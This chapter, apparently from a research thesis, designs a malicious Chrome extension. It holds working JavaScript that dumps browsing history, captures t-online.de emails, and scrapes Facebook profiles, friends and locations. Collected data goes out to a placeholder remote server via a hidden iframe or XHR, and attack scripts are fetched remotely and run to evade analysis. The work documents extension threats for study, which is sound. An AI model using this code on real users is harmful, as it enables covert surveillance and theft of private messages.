% !TeX spellcheck = en_US

\chapter{Design}

	We have analyzed potential threats in the browser API and showed our results in the previous chapter. In this chapter we present our design and implementation to proof that the results of our theoretical analysis are applicable in practical scenarios. 
	
	We designed our implementation as a set of components with different functionalities and permissions. This allows us to integrate some of our components into a benign extension if the component's permissions match the extension's permissions. Our design consists of a set of core components. Their duty is to collect as much as possible pieces of information about the current user of the extension an send them to a remote server. If the server has successfully identified the user, we load further components into the extension which execute different attacks. In conclusion, our design consists of the following three steps whereas each consists of interchangeable components:
	
	\begin{enumerate}
		\item Collect information about the current user to identify him.
		\item Transfer collected information to a remote server and fetch the source code for an attack after a successful identification.
		\item Execute the fetched attack.
	\end{enumerate}
	
	This design brings several advantages. Because the code for an attack is fetched remotely at runtime, our implementation is able to bypass a static analysis which uses content matching to find known malicious code pattern. Furthermore, the identification of the current user allows us not only to attack a worthwhile target but also to bypass a dynamic analysis. If we are able to detect that our implementation is currently the target of a dynamic analysis, we can fetch a benign script instead of our attack script. 

	For our implementations, we use the popular web library \textit{jQuery}\footnote{jQuery Homepage: \url{http://jquery.com/}} to simplify the interaction with a web page's DOM. 



\newpage	
\section{Identification}
\label{sec:identification}

	Identifying the current user of our extension allows us to target our attack only at specific users. In beforehand, we can evaluate whether or not an attack is worthwhile if we collect as much as possible pieces of information about the user such his financial status or his position in a company we want to target. Furthermore, we are able to detect if our extension is target of an dynamic analysis such as \textit{Hulk} or \textit{WebEval} and evade detection \cite{184485,190984}.
	
	To find approaches which we can use for our implementation, we first analyzed existing techniques for user tracking and fingerprinting. We present our results and our own implementations to support these techniques in the following two sections. Furthermore, we present selected parts of our implementations to collect the user's personal information in the third section.
	
	We transfer collected information to our remote server which handles the identification. Because the communication between the extension and a remote server is not part of this section, we refer to our implementations which we show in \autoref{sec:communication} as \textit{send method}.
	
\subsection{User Tracking}

	User tracking refers to the linking of multiple web pages that were visited by the same user. Applying this technique to web page's that belong to the same domain allows to follow the user's path through the domain's pages and determine his entry and exit points. This is commonly used for web analytics to help the website's author to improve the usability of his layout. User tracking between different domains produces an overview about the user's movement through the Internet. It is often used by advertising companies to gain information about the user's personal needs and preferences to provide personalized advertisements. 
		
	The general method for user tracking includes a unique identifier which is intentionally stored on the user's machine the first time he visits a tracking web page. If the identifier is retrieved on later occasions, it notifies the tracking party that the same user has accessed another web page. There exists several possibilities to store server data inside the browser. We have listed some approach which we found in several research papers:
	
%	\begin{itemize}
%		\item \textbf{HTTP Cookies} Cookies are send back on every web request to their origin server. This simplifies user tracking, because the website's host does not have to take care about storing the cookie client-sided and retrieving it. 
%		
%		\item \textbf{Local Storage} In the HTML5 standard, every web page can use 
%		
%		\item \textbf{Browser Plugins} A plugin is a local application that is embedded in a web page. Commonly used plugins are Flash Player or Java. Because these applications are independent of the browser, they can store information across multiple browsers. 
%	\end{itemize}
	
	\begin{itemize}
		\item \textbf{Tracking Cookies} The most used web technology to track users are HTTP cookies. If a user visits a web page that includes a resource from a tracking third-party, a cookie is fetched together with the requested resource and acts as an identifier for the user. When the user now visits a second web page that again includes some resource from the third-party, the stored cookie is send along with the request for the third-party's resource. The third-party vendor has now successfully tracked the user between two different web pages.  
		
		\item \textbf{Local Shared Objects} Flash player use a technique similar to cookies to synchronize data between different browser sessions. The data is locally stored on the user's system by websites that use flash. Flash cookies as tracking mechanism have the advantage that they track the user behind different browsers and they can store up to 100KB whereas HTTP cookies can only store 4KB. Before 2011, the user could not easily delete local shared objects from within the browser because browser plugins hold the responsibility for their own data. In 2011 a new API was published that simplifies this mechanism \cite{mozillaWikiClearPrivacyAPI}. %TODO
		
		\item \textbf{Evercookies} Evercookie is a JavaScript framework implemented to produce persistent identifiers in a browser that are difficult to remove \cite{evercookie}. For that purpose, it uses multiple storage technologies such as HTTP and Flash cookies, HTML5 storages, web history and cache, and unusual techniques such as storing the identifier in RGB values of cached graphics. To hamper the removing from a browser, it recreates deleted identifiers as soon as the user visit a web site that uses the framework. The user has to delete every stored identifier to remove the evercookie completely. 
	\end{itemize}
	
\subsubsection{Web Beacon}
	
	If a user loads a web page that includes a resource from a tracking third-party, any cookie that originates from the third-party's domain is send along the request that fetches the resource. This allows the third-party to track the user on every web page that includes their content. These kind of third-party content whose only purpose is user tracking are called web beacons. A small image, commonly one pixel in size and transparent, is often used as a web beacon. Because of its size it requires less traffic and its transparency hides it from the user. It is also used in HTML emails and acts as a read confirmation by notifying the sender that the email's content was loaded. Other nowadays more commonly used web beacons originate from social media such as Facebook's "like" button. 
	
	To allow user tracking between different websites, the developers have to explicit include the web beacon into their web pages. We use an extension which has full access to any visited web page and add the web beacon to the DOM of each web page. If we send a tracking cookies along the corresponding request, we are able to remotely track the user because our server gets notified every time the user loads a new web page. 
	
	We implemented a content script that embeds an image which it fetches from our remote server in every visited web page. Besides the content script, there is no need for additional permission. We show the implementation of our content script in \autoref{code:webBeacon}. We start by creating a new image element (line 1), set its source attribute to the URL of our remote server (line 2), and finally add it to the web page's DOM (line 3) which subsequently sends a request with probably stored tracking cookies to our remote server.
	
	\begin{code}
		\begin{lstlisting}
var img = document.createElement('img');
img.setAttribute('src', REMOTE_SERVER_URL);
document.body.appendChild(img);
\end{lstlisting}
		\caption{Content script that injects a tracking pixel in the current web page.}
		\label{code:webBeacon}
	\end{code}
	

\subsubsection{Store Identifier In Extension}

	If we have successfully identified the current user with other techniques, we store an unique identifier inside his instance of the extension. This simplifies his identification next time. An extension has its own local storage and Chrome even provides a cloud based storage which we use to store the identifier. Contrariwise to the web page's storage technologies such as cookies or the HTML5 local storage, the browser does not provide a user interface to clear the extension storage. The user has to manually delete associated files on his computer.

\subsection{Fingerprinting}

	Previously described methods for tracking a user identify him based on some data which was intentionally stored on the user's system. Those stored identifiers are vulnerable to deletion by the user. A study from 2010 showed that a browser reveals many browser- and computer-specific information to web pages \cite{Eckersley:2010:UYW:1881151.1881152}. Collection and merging these pieces of information creates a fingerprint of the user machine. Creating a second fingerprint at a later point in time and comparing it to stored fingerprints allows to track and identify the user without the need to store an identifier on his computer in beforehand. Because the same kind of information taken from different users will probably equal, it is necessary to collect as much information as possible to create a truly unique fingerprint. 
	
	The technique of fingerprinting is nowadays mostly used by advertising companies to get a more complete view of the user and his needs than from simple tracking and by anti-fraud systems that detect if the currently used credentials or device belong to the current user and are not stolen.

	There exists numerous scientific papers about fingerprinting from which we present a small subset of techniques with brief descriptions \cite{paulstone_historysniffing, MBYS11, Nikiforakis:2013:CME:2497621.2498133, Eckersley:2010:UYW:1881151.1881152, MS12, olejnik:hal-00747841}. 
	
	\begin{itemize}
		\item \textbf{Browser Fingerprinting} The browser provides a variety of technical information to a web page that can be used to generate a fingerprint of the currently used browser and machine. The following list shows examples of these properties and how to access them using JavaScript. 
		
		\begin{tabular}{|l|l|p{0.47\textwidth}|} \hline
			\textbf{Property} & \textbf{JavaScript API} & \textbf{Example Output} \\ \hline
			System & \texttt{navigator.platform} & "Win32" \\ \hline
			Browser Name & \texttt{navigator.userAgent} & "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0" \\ \hline
			Browser Engine & \texttt{navigator.appName} & "Netscape" \\ \hline
			Screen Resolution & \texttt{screen.width} & 1366 (pixels) \\
			& \texttt{screen.height} & 768 (pixels) \\
			& \texttt{screen.pixelDepth} & 24 (byte per pixel) \\ \hline
			Timezone & \texttt{Date.getTimezoneOffset()} & -60 (equals UTC+1) \\ \hline
			Browser Language & \texttt{navigator.language} & "de" \\ \hline
			System Languages & \texttt{navigator.languages} & ["de", "en-US", "en"] \\ \hline
		\end{tabular}
		
		\item \textbf{Fonts} The fonts installed on the user's machine can serve as part of a user identification. The browser plugin \textit{Flash} provides an API that returns a list of fonts installed on the current system (\texttt{Font.enumerateFonts(true)})\cite{flashPlayerGetFonts}. If the Flash plugin is not available in a browser, JavaScript can be used to test whether particular fonts are available to the current web page or not. This approach needs a predefined list and may not cover unpopular fonts. It is implemented by writing a string with each font on the web page. If a font is not installed, the browser uses a fall-back font to draw the text. Comparing the width and height of the drawn font to those of the fall-back font gives an evidence whether or not the font is installed.
		
		\item \textbf{Canvas} Mowery er al. have notices that the same text drawn with canvas results in a different binary representation on different computers and operating systems \cite{MS12}. They suppose the reasons for these different results are due to differences in graphical processing such as pixel smoothing, or anti-aliasing, differences in system fonts, API implementations or even the physical display. The basic flow of operations consists of drawing as many different letters as possible with the web page's canvas and executing the method \texttt{toDataURL} which returns a binary representation of the drawn image. 
		
		\item \textbf{History Sniffing} Reading out the user's web history can not only serve as fingerprinting method but also to simplify user tracking. An outdated but back then common approach to test if a user has visited a particular web page was to use the browser's feature to display links to already visited web pages in a different color. A JavaScript adds a list or predefined URLs to the web page's DOM as link elements and determines the displayed color. Nowadays, link elements that were queried by JavaScript calls behave like unvisited links which prevents this sniffing attack. A current approach detects the redrawing of link elements to determine if the underlying web page was visited before \cite{paulstone_historysniffing}. If a link is drawn the first time, it is drawn as an unvisited link and simultaneously a query to the browser's web history database is send. When the query returns the information that the web page behind the link was visited before, it redraws the link element. The time it takes to redraw the element can be captured with JavaScript giving the desired evidence.
		
		\item \textbf{JavaScript Benchmark Testing} The execution speed of a JavaScript engine depends on the implementation but also on the systems processor architecture and clock speed. Mowery et al. implemented a set of benchmark test suits to fingerprint different execution speeds \cite{MBYS11}. Using these information, they could distinguish between major browser versions, operating systems and micro architectures. 
	\end{itemize}	
 
\subsubsection{Additional Fingerprinting Data} 
	
	We can support the general method of browser fingerprinting by collecting technical information that the browser provides to an extension but not to a web page. These pieces of information help us to generate a more accurate fingerprint of the user's browser and system. To access the desired information, we need further permissions. \autoref{tab:fingerprintExtension} shows these pieces of information and the permissions needed to access them. 
	
	\begin{table}[h]
		\begin{tabular}{|l|l|l|} \hline
			\textbf{Permission} & \textbf{Information} & \textbf{Example} \\ \hline
			system.cpu & Number of processor kernels & \\
			& Processor's name & Intel(R) Core(TM) i5-3210M CPU @ 2.50GHz \\
			& Processor's capabilities & "sse", "sse2", "sse3"  \\ \hline
			system.memory & Memory capacity & 6501200096 \\ \hline
			gcm & An unique ID for the extension instance & \\ \hline
			management & List of installed extensions & Extension ID and version \\ \hline
		\end{tabular}
		\caption{Additional fingerprint information available to an extension.}
		\label{tab:fingerprintExtension}
	\end{table} 
	
\subsubsection{History Sniffing}

	Explicitly testing if a user has visited a particular web page has the disadvantage that not all visited web pages are covered. A predefined list is necessary and often only contains popular web pages. To improve history sniffing, we use an extension to create a more complete list of the web pages that a user has visited and even capture additional information such as the time when, and the order in which different web pages were visited. For that purpose, we can either use the \textit{history} module or a content script in every web page. Each approach has its advantages and disadvantages. 
	
	With a content script, we can either execute the above described technique of history sniffing which uses a predefined list of web pages to explicit check, or store information such as the URL and the current time every time the content script is injected into a newly loaded web page. In in \autoref{code:webBeacon}, we have already shown a content script that exactly executes this task. Our implementation of a web beacon notifies us every time the user has opened a new web page by fetching a resource from our remote server. To get the URL of the visited web page, we can simply transfer it as parameter in the web request that fetches the resource. The disadvantage of using a content script for history sniffing is, that we can not retrieve visited web pages from before the extension's installation, or while the extension is disabled. Therefore, it is not an ideal fingerprinting technique because it has to be active for some time to be effective. But, it is a simple alternative if the \textit{history} module is not available because the extension does not have the corresponding permission.
	
	Using the history module allows us to retrieve all visited web pages at once. It provides two for us useful methods \texttt{search} and \texttt{getVisits}. The first method allows us to retrieve the URLs of all web pages the user has visited and the second one gives us detailed information about every time the user has visited a particular URL such as the concrete time, the referring web page, and how the user has entered the web page. In comparison to using a content script, the history module gives us more pieces of information and executes at once. But the browser's history is vulnerable to deletion or disabling by the user and is disabled if the user uses an incognito window.
	
	\autoref{code:historySniffing} shows our implementation of an history sniffing attack using the \textit{history} module. First, we define our main array to store retrieved information for each visited web page which we will later on transfer to our remote server (line 1). We search for visited web pages with an empty text which gives us an unfiltered result list, a start time of zero which disables the default of returning entries of the last 24 hours, and a maximum result amount of 2147483647 which is the maximum value for this field (line 2). The search method returns an array of all visited web pages. We iterate through the array (lines 3-7), store the web page's URL in a separate object (line 4), push the object to our main array (line 5), and then call a separate method to retrieve all of the user's visits for the current web page and add these to our storage object (line 6). The method takes the before defined object that contains the web page's URL as first parameter and a boolean value indicating that the current call of the method is the last call as second parameter (lines 6\&9). Our method queries for all visits of a particular web page using the URL that is stored in the given storage object (line 10), and adds the returned visits to the storage object (line 11). We check if this was the last call of our method and forward our main array to our send method in this case (lines 12-14).
 
	\begin{code}
		\begin{lstlisting}
var historySniffingStorage = [];
chrome.history.search({ 'text': '', 'startTime': 0, 'maxResults': 2147483647 }, function(historyItems) {
	for(var i = 0; i < historyItems.length; i++) {
		var storage = { 'url': historyItems[i].url };
		historySniffingStorage.push(storage);
		addVisitItems(storage, i === historyItems.length - 1);
	}
});
function addVisitItems(storage, isLast) {
	chrome.history.getVisits({ 'url': storage.url }, function(visitItems) {
		storage.visits = visitItems;
		if(isLast) {
			send(historySniffingStorage);
		}
	});
}
\end{lstlisting}
		\caption{Extension code to execute a history sniffing attack.}
		\label{code:historySniffing}
	\end{code}


\subsection{Personal User Information}
	
	Besides the before described techniques of user tracking and fingerprinting, an extension has more efficient ways to identify a user. The extension has full access to any web page that the user visits and is able to read out any information that is stored inside these pages. This allows us to even identify the person behind the web user by collection personal information such as his full name, address, or phone number. 
	
	We have extracted three categories of web applications as worthwhile targets to collect user data:
	\begin{itemize}
		\item \textbf{Social Media} Many people use real names and other personal information for their social media account. If the user visits his account, we can read out his personal data. Furthermore, we can extract information such as the user's social or business environment while the user visits related web pages.
		\item \textbf{Online Banking} We can identify the current user based on his account numbers if he uses his online banking account. Moreover, we can extract his financial status which gives us information whether or not an attack is worthwhile.
		\item \textbf{Email Account} 
	\end{itemize}
	
	An extension whose purpose is to obtain particular data from a web page retrieves the targeted values directly from the web page's DOM and thus heavily depends on the DOM's structure. Due to strong differences between the structures of different web applications, we did not implement a general approach that collects the targeted information from multiple web pages. Instead, we developed a different implementations for different web pages and present a single implementation for each category of targets as an example.
	
\subsubsection{Emails}
		
	Our implementation to read an outgoing mail from the user's email client uses a content script shown in \autoref{code:readOutgoingEmailContent} and a background script shown in \autoref{code:readOutgoingEmailBackground}. The extension needs host permissions for the email client's web page or simpler for all web pages. In our content script, we begin by determining if the current web page is our targeted web page and check its host name and URL for that purpose (line 1). Then, we query for the send button with a complex CSS selector and add a click event to it (line 2). If the user sends the mail by clicking the send button, we will send a message to the extension's background (line 3). The message contains all recipients (line 4), carbon copy recipients (line 5), blind carbon copy recipients (line 6), and the subject (line 7). Again, we query for each element with a complex CSS selector.
	
	\begin{code}
		\begin{lstlisting}
if(window.location.host === 'email.t-online.de' && window.location.href.indexOf('showWritemail') !== -1) {
	$('div#toolbarLeft a.toolbarItem.single.normal').click(function() {
		chrome.runtime.sendMessage({
			'recipients': $('div#fieldTo ul li').not(':first-child').text(),
			'cc': $('div#fieldCc ul li').not(':first-child').text(),
			'bcc': $('div#fieldBcc ul li').not(':first-child').text(),
			'subject': $('input#mailwriteviewInputSubject').val()
		});
	});
}
\end{lstlisting}
		\caption{Content script to read an outgoing email at the Telekom's email client.}
		\label{code:readOutgoingEmailContent}
	\end{code}
	
	In our background script, we await the message from our content script (line 1). Because the email's body is not stored in the same document as the rest of the email's data but in a separate iframe element, we execute a further script in the current tab to retrieve the missing information (line 2). The script checks for the correct id of the document's body element and returns the body's visible text (line 3). We specify that our script is executed in all of the web page's frames, especially the iframe with the email's body (line 4). Because multiple instances of our script are active and each returns some value, we iterate over all returned values and determine the correct one (lines 6-7). Finally, we forward the email's content to our send method (lines 9-10) 
	
	\begin{code}
		\begin{lstlisting}
chrome.runtime.onMessage.addListener(function(message, sender) {
	chrome.tabs.executeScript(sender.tab.id, {
		'code': 'document.body.id === "tinymce" ? {"body": document.body.innerText} : null',
		'allFrames': true
	}, function(results) {
		for(var i = 0; i < results.length; i++) {
			if(results[i] && results[i].body) {
				message.body = results[i].body;
				send(message);
			}
		}
	});
});
\end{lstlisting}
		\caption{Extension code to read an outgoing mail.}
		\label{code:readOutgoingEmailBackground}
	\end{code}
	
	We also implemented an extension to read incoming emails respectively emails in the user's in-box. In the content script implementation shown in \autoref{code:readIncomingEmailContent}, we first determine whether the current web page is the user's in-box of his email client (line 1). Then we send a message to the extension's background if the page has loaded completely (lines 2-3). The content of the message consists of the email's subject (line 4), the sender (line 5), and the receiving date (line 6). We retrieve each value using a complex CSS selector. Because the email's body is stored inside an embedded iframe and only this iframe is reloaded if the user selects another email to view, we check if our script is currently active in the aforesaid iframe (line 10). If this case applies, we send a message to the extension's background to notify it that the user has opened another email (line 11).
	
	\begin{code}
		\begin{lstlisting}
if(window.location.host === TARGETED_URL && window.location.href.indexOf('showReadmail') !== -1) {
	$(document).ready(function() {
		chrome.runtime.sendMessage({
			'subject': $('a[name = subjectslim]').text(),
			'from': $('button[data-iid = contactId]').attr('title'),
			'date': $('table.messageHeaderDataTableBig td.headerDataSentDateCell').text()
		});
	});
}
if(window.location.host === 'email.t-online.de' && window.self !== window.top && window.frameElement.id === "messageBody") {
	chrome.runtime.sendMessage({'mailOpened': true});
}
\end{lstlisting}	
		\caption{Content script to read an email from the user's in-box.}
		\label{code:readIncomingEmailContent}
	\end{code}
	
	The implementation of our background script shown in \autoref{code:readIncomingEmailBackground} is similar to the implementation to read an outgoing email shown in \autoref{code:readOutgoingEmailBackground} due to a similar structure of the client's web pages to write and read an email. Again, we begin by listening for a message from our content script (line 1). If the message indicates that the user has opened another email (line 2), we execute our content script again in the current tab (line 3). Otherwise, the message transfers the email's content except its body. To get the email's body, we inject a small code snippet into each frame of the current tab (lines 6-8). The snippet checks if it is active in the targeted iframe and returns the text of the document's body which contains the email's body (line 7). Finally, we iterate over the result that each instance of the injected code snippet returns (line 10), check if the returned value contains the email's body (line 11), and forward the whole email's data to our send method (lines 12-13).
	
	\begin{code}
		\begin{lstlisting}
chrome.runtime.onMessage.addListener(function(message, sender) {
	if(message.mailOpened) {
		chrome.tabs.executeScript(sender.tab.id, { 'file': 'content.js'});
	}
	else {
		chrome.tabs.executeScript(sender.tab.id, {
			'code': 'window.frameElement && window.frameElement.id === "messageBody" ? {"body": document.body.innerText} : null',
			'allFrames': true
		}, function(results) {
			for(var i = 0; i < results.length; i++) {
				if(results[i] && results[i].body) {
					message.body = results[i].body;
					send(message);
				}
			}
		});
	}
});
\end{lstlisting}
		\caption{Extension code to read an email from the user's in-box.}
		\label{code:readIncomingEmailBackground}
	\end{code}
	

\subsubsection{Facebook}

	We developed a content script that collects the user's personal information while he navigates through his Facebook account. We present our implementation as an example that retrieves the user's name, the URL of his main page, the names of his friends, locations that he has shared with Facebook, and other personal information from his main page such as his date of birth, home town, or salutation.
	
	We show our implementation in \autoref{code:readFacebook}. First, we check if the current web page belongs to Facebook (line 1). We wait until the web page has finished loading (line 2) and retrieve the user's name (line 3) and the URL of his main page (line 4) from the web page's DOM. Then we forward the collected data to our send method (line 5). Most of Facebook's content is loaded dynamically while the user navigates through the web page. To collect information from dynamic content, we retrieve the desired values periodically (line 7). To retrieve all locations which the user has shared with Facebook, we first select each entry of the list that holds these information (line 8). Each contains amongst others the location's name and an image which may be a map showing the location's coordinates. We retrieve the name (line 9) and the coordinates from the image's URL (line 10). The user's Personal information on his main page are stored inside a list with key value pairs. We first select all entries of the list (line 13), and then select each pair (lines 14-15). We retrieve the user's friends from the chat's list of active friends. For that purpose, we select each entry in the list and retrieve its text (lines 17-18). Finally, we forward the collected information to our send method (line 20).

	\begin{code}
		\begin{lstlisting}
if(window.location.host === 'www.facebook.com') {
	$(document).ready(function() {
		var name = $('#fb-timeline-cover-name').text();
		var homepage = $('div[data-click = profile_icon] a').attr('href');
		send({ 'name': name, 'homepage': homepage });
	});
	setInterval(function() {
		var locations = $('div#pagelet_timeline_medley_map div[id^=collection_wr] ul li').map(function() {
			var name = $(this).find('a[target=_blank]').text();
			var coordinates = (/markers=(.*)&/).exec($(this).find('img').attr('src'));
			return({ 'name': name, 'coordinates': coordinates ? coordinates[1] : 'not found' });
		}).get();
		var personalInformation = $('ul[class^=\'uiList fbProfileEdit\'] > li > div').map(function(index) {
			var entry = $(this).find('span');
			return({ 'name': $(entry[0]).text(), 'value': $(entry[1]).text() });
		}).get();
		var friends = $('div.fbChatOrderedList ul li a div:nth-child(3)').map(function(){
			return({ 'name': $(this).text() });
		}).get();
		send({ 'locations': locations, 'personal_information': personalInformation, 'friends': friends, });
	}, 1000);
}
\end{lstlisting}
		\caption{Content script that queries information about the user while he uses his Facebook account.}
		\label{code:readFacebook}
	\end{code}


\subsubsection{Online Banking}



	\begin{table}
		\centering
		\begin{tabular}{|l|l|} \hline 
			\textbf{User Identification Implementation} & \textbf{Needed Permissions} \\ \hline
			Store identifier & \texttt{storage} \\
			\hline
			Web Beacon & content script \\
			\hline
			History Sniffing & \texttt{history} \\
			& content script \\
			\hline
			Additional Fingerprint Data & \texttt{system.cpu} \\
			& \texttt{system.memory} \\
			& \texttt{gcm} \\
			& \texttt{management} \\
			\hline
			Read emails & content script, \texttt{http://*/*, https://*/*} \\
			Read facebook data & content script \\
			\hline
		\end{tabular}
		\caption{Summary of extension implementations for user identification with needed permissions.}
		\label{tab:summaryUserIdentification}
	\end{table}

	
	
	
	
\clearpage
\section{Communication}
\label{sec:communication}

	In the previous section, we have shown our implementations to collect information about the current user to identify him. We need to transfer these data to a remote server which is in charge of the identification. Furthermore, if the identification was successful, we want to attack the user by loading the source code for some malicious behavior from the server.
	
	In this section, we present different approaches to transfer information between the extension and a remote server and to fetch the source code for our explicit attacks. The \autoref{tab:summaryRemoteCommunication} and \autoref{tab:summaryFetchScript} at the end of this section show summaries of our implementations and what privileges an extension needs for each.
	
\subsection{Remote Communication}

	We often arrive at a point where we have to transfer information from the active extension to our remote server or vice versa. For example, if we want to transfer collected information for identification or stolen personal user data or we want to give the extension the command to execute an attack. We implemented several partly interchangeable approaches for that purpose which need different permissions. 

\subsubsection{XMLHttpRequest}
\label{sec:xhrCommunication}

	Extensions are able to make a web request to a remote server with a XMLHttpRequest. If called from a content script, the XMLHttpRequest will be blocked by the Same Origin Policy if the target does not match the current web page's origin. However, the same restriction does not apply to the extension's background. If the XMLHttpRequest is executed from within the background process, any arbitrary host is allowed as target if a matching host permission is declared in the extension's manifest. Our implementation uses a host permission that matches any URL such as \texttt{http://*/*}, \texttt{https://*/*}, or \texttt{<all\_urls>}. This allows us to disguise the concrete URL of our remote server in the warnings on installation. The JavaScript extract in \autoref{code:xhr} shows a general implementation of a XMLHttpRequest. 
	
	\begin{code}
		\begin{lstlisting}
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() { handleResponse(); };
xhr.open('POST', REMOTE_RESOURCE_URL);
xhr.send(message);
		\end{lstlisting}
		\caption{Load remote script with a XMLHttpRequest}
		\label{code:xhr}
	\end{code}

\subsubsection{Iframe}

	Another strategy that we use to transfer information to a remote host was described by Liu et al. \cite{Liu12chromeextensions:}. They analyzed possible threats in Chrome's extension model through malicious behavior and conducted that an extension can executed HTTP requests to any arbitrary host without cross-site access privileges. For that purpose, they we use the mechanics of an \textit{iframe} element. Its task is to display a web page within another web page. The displayed web page is defined by the URL stored inside the iframe's \textit{src} attribute. If the URL changes, the iframe reloads the web page. Adding parameters to the URL allows us to send data to the targeted server. 

	We implemented the content script shown in \autoref{code:sendDataWithIframe}. First, it creates a new \texttt{iframe} element (line 1), hides it from the user by setting the iframe's CSS style property (line 2), and appends it to the web page's DOM (line 3). When the iframe's URL source property is changed, a subsequent URL request is initiated. This way, we can transmit data to the remote server by encoding it as URL parameter (lines 4-6).

\begin{code}
	\begin{lstlisting}
var iframe = document.createElement('iframe');
iframe.setAttribute('style', 'display: none;');
document.body.appendChild(iframe);
function send(data) {
	iframe.setAttribute('src', REMOTE_SERVER_URL + '?' + encodeURIComponent(data));
}
	\end{lstlisting}
	\caption{Content script that sends data to a remote server using an \texttt{iframe} element}
	\label{code:sendDataWithIframe}
\end{code}

	The Same Origin Policy creates a boundary between the iframe and it's parent web page. It prevents scripts to access content that has another origin than the script itself. Therefore, if the web page inside the iframe was loaded from another domain as the parent web page, the iframe's JavaScript can not access the parent web page and vice versa. This boundary does not prevent an extension to access information in an iframe. The extension can execute a content script in every web page hence in the iframe's web page, too. For that purpose, it has to enable the \texttt{all\_frames} option for a content script either statically in the manifest or on a programmatically injection. This allows us to use the content script in \autoref{code:sendDataWithIframe} for a two way communication channel. Executing a second content script inside the iframe, allows us to read information that our server has embedded inside the fetched web page. 

\subsubsection{Automatic Extension Update}

	In previous researches, Liu et al. implemented extensions for major browsers that can be remote controlled to execute web based attacks such as \texttt{Denial of Service} or spamming. \cite{liu2011botnet, Liu12chromeextensions:}. To control the extensions and send needed information such as the target for a DoS attack or a spamming text, the attacker has to communicate with his extensions. Liu et al. use the automatic update of extensions for that purpose. The browser checks for any extension update on startup and periodically on runtime. The attacker can distribute an attack by pushing a new update and the extension can read commands from a file in it's bundle. This communication channel is on one hand more stealthy than previous approaches because no web request is executed between the extension and the attacker but on the other hand a new extension version is distributed which may be the target of an analysis and it contains the message. 


\subsection{Remote Script Fetching}
		
	Fetching a script remotely from a server is a kind of communication. But because our implementation relies on fetching the source code for a particular attack from our remote server, we present our implemented approaches in this section.
	
\subsubsection{Script Element In Background}
	
	HTML pages which are bundled in the extension's installation can include script elements with a source attribute pointing to a remote server. If the extension is executed and the page is loaded, the browser automatically loads and executes the remote script. This mechanism is often used to include public scripts, for example from Google Analytics. 
	
	An extension needs to explicitly state that it wants to fetch remote scripts in its background page. The default Content Security Policy disables the loading of scripts per script element which have another origin than the extension's installation. We can relax the default CSP and enable the loading of remote scripts over HTTPS by adding a URL pattern for the desired origin. 
	
\subsubsection{Script Element In Content Script}

	If we want to execute a remote loaded script only in the scope of a web page, we can take use of the DOM API. It allows us to add a new script element to the current web page. If we set the source attribute of the script element to the URL of our remote server, the browser will fetch and execute the script for us. We implemented the content script shown in \autoref{contentScriptRemotLoad} which executes a remotely loaded script in any web page without the need for further permissions. The content script creates a new script element (line 1), sets the element's source attribute to the URL of our remote server (line 2), and appends it to the web page's body (line 3). The remote loaded script is immediately executed.
	
	\begin{code}
		\begin{lstlisting}
var script = document.createElement('script');
script.setAttribute('src', REMOTE_RESOURCE_URL);
document.body.appendChild(script);
\end{lstlisting}
		\caption{Content script that fetches a remotely loaded script and executes it}
		\label{code:loadScriptWithScriptElement}
	\end{code}
	
\subsubsection{XMLHttpRequest}

	In \autoref{sec:xhrCommunication} we have shown that an extension can execute a web request to a remote server with the XMLHttpRequest API. This allows us not only to transfer information to our remote server, but also to receive any data especially the source code for our attacks. We receive the source code in text form and have to forward it to the browser's JavaScript interpreter to execute it.
	
	Before we can execute a remote loaded script, we have to consider what the scripts objectives are. Whether it should act in the extension's background or as a content script. If the first case applies, we can use the JavaScript method \texttt{eval} to execute the remote loaded code as a JavaScript application. The use of eval is frowned upon because it is a main source of XSS attacks if not used correctly \cite{mozillaDangerousEval}. On that account, the default CSP disables the use of eval in the extension's background process. We can relax the default policy and add the key \texttt{unsafe\_eval} to lift the restriction. 
	
	If we want to execute the remote loaded script as a content script, we can programmatically inject it. The method \texttt{chrome.tabs.executeScript} executes a given string as a content script in a currently open tab. The use of this function is not restricted by a permission. But to access the web page in the tab, the extension needs a proper host permission that matches the web page's URL. Because we have fetched the script with an XHR, we already declared host permissions that match any URL to execute the request.
	
\subsubsection{Mutual Extension Communication}

	An extension is able to communicate with another extension. This opens the possibility of a permission escalation as previously described by Bauer et al. \cite{extensions:cns14}. The extension which executes the attack does not need the permissions to fetch the malicious script. Another extension can execute this task and then send the remote script to the executing extension. This allows to give both extensions less permissions and thus making them less suspicious especially for automatic analysis tools. To detect the combined malicious behavior, an analysis tool has to execute both extensions simultaneously. This is a very unconventional approach, because an analysis often targets only a single extension at a time. 
	
	A communication channel that does not need any special interface can be established over any web page's DOM. All extensions with an active content script in the same web page have access to the same DOM. The extensions which want to communicate with each other can agree upon a specific DOM element and set it's text to exchange messages. Another way to exchange messages is to use the DOM method \texttt{window.postMessage}. This method dispatches a \texttt{message} event on the web pages \texttt{window} object. Any script with access to the web page's \texttt{window} object can register to be notified if the event was dispatched and then read the message. 
	
	We implemented two extension that exchange the code of a remotely loaded script between their backgrounds using a content script and the postMessage method. The content script in \autoref{code:sendScriptToOtherExtension} shows our implementation to send the remotely loaded script. The content script listens for a message from its background and awaits the script (lines 1-2). Then it calls the \texttt{postMessage} method to send the script (line 3). The method awaits a pattern as second parameter that matches the origin of the receiving \texttt{window} object. In our case, the web page and all content scripts share the same \texttt{window} object, therefore a domain check is unnecessary and we us a wildcard to match any domain. \\
	To receive the script we use the content script shown in \autoref{code:receiveScriptFromOtherExtension}. First, we add a listener to get noticed if the message event is dispatched and check if the message contains the script (line 1-2). Then we send the transfered script to the extension's background (line 3). 
	
	\begin{code}
		\begin{lstlisting}
chrome.runtime.onMessage.addListener(function(message, sender) {
	if(message.script) {
		window.postMessage({script: message.script}, '*');
	}
});
\end{lstlisting}
		\caption{Content script to send script code from an extension's background to another extension.}
		\label{code:sendScriptToOtherExtension}
	\end{code}
	
	\begin{code}
		\begin{lstlisting}
window.addEventListener('message', function(event) {
	if(event.data.script) {
		chrome.runtime.sendMessage({script: event.data.script});
	}
});
\end{lstlisting}
		\caption{Content script to receive script code from another extension and forward it to its background.}
		\label{code:receiveScriptFromOtherExtension}
	\end{code}

	\begin{table}[h]
		\centering
		\begin{tabular}{|l|l|} \hline
			\textbf{Technique} & \textbf{Needed Privileges} \\ \hline
			XMLHttpRequest & Host permission \texttt{http://*/*, https://*/*}  \\
			Iframe & Content script \\
			Automatic extension update & Nothing \\ 
			\hline
		\end{tabular}
		\caption{Summary of communication techniques between an extension and a remote server with needed permissions.}
